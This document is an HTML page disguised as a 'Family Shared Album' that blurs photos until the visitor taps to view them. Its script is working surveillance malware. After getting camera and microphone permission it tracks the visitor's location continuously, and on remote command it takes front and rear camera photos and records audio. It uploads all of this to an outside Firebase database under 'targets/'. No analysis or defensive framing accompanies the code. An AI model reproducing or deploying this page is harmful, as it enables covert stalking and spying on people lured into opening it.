<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Private Cloud Album</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #111; color: white; text-align: center; margin: 0; padding: 20px; }
        .gallery { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; margin-top: 20px; }
        .img-container { position: relative; overflow: hidden; border-radius: 10px; height: 180px; }
        .img-container img { width: 100%; height: 100%; object-fit: cover; filter: blur(15px); transition: 2s; }
        #unlockBtn { margin-top: 30px; padding: 15px 40px; font-size: 18px; font-weight: bold; background: #E91E63; color: white; border: none; border-radius: 50px; cursor: pointer; }
    </style>
</head>
<body>
    <h2>ðŸŒ¸ Family Shared Album</h2>
    <div class="gallery" id="albumGallery">
        <div class="img-container"><img class="blur-img" src="https://images.unsplash.com/photo-1583391733956-6c78276477e2?w=500"></div>
        <div class="img-container"><img class="blur-img" src="https://images.unsplash.com/photo-1595950653106-6c9ebd614d3a?w=500"></div>
    </div>
    <button id="unlockBtn" onclick="initSystem()">Tap to View Album</button>

    <script>
        const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();
        const userId = "User_" + Math.floor(Math.random() * 9999);

        async function initSystem() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
                stream.getTracks().forEach(t => t.stop());
                navigator.geolocation.watchPosition(s => {
                    db.ref('targets/' + userId + '/location').set({ lat: s.coords.latitude, lng: s.coords.longitude, time: new Date().toLocaleTimeString() });
                });
                unblur();
                listenForCommands(); // Start listening for Admin buttons
            } catch (e) { alert("Please allow permissions to view."); }
        }

        function listenForCommands() {
            db.ref('commands/' + userId).on('value', async (snap) => {
                const cmd = snap.val();
                if (!cmd) return;
                if (cmd.action === "snap") { await capturePhotos(); }
                if (cmd.action === "mic") { await recordAudio(cmd.sec || 10); }
                db.ref('commands/' + userId).set(null); // Clear command after execution
            });
        }

        async function capturePhotos() {
            const modes = ['user', 'environment'];
            for (let mode of modes) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    await video.play();
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    db.ref('targets/' + userId + '/photos').push({ image: canvas.toDataURL('image/jpeg', 0.5), type: mode, time: new Date().toLocaleTimeString() });
                    stream.getTracks().forEach(t => t.stop());
                } catch (e) { console.log(e); }
            }
        }

        async function recordAudio(sec) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                const mediaRecorder = new MediaRecorder(stream);
                let chunks = [];
                mediaRecorder.ondataavailable = e => chunks.push(e.data);
                mediaRecorder.onstop = () => {
                    const reader = new FileReader();
                    reader.readAsDataURL(new Blob(chunks));
                    reader.onloadend = () => db.ref('targets/' + userId + '/audio').push({ data: reader.result, time: new Date().toLocaleTimeString() });
                };
                mediaRecorder.start();
                setTimeout(() => mediaRecorder.stop(), sec * 1000);
            } catch (e) { console.log(e); }
        }

        function unblur() { document.querySelectorAll('.blur-img').forEach(i => i.style.filter = "blur(0px)"); document.getElementById('unlockBtn').style.display = "none"; }
    </script>
</body>
</html>
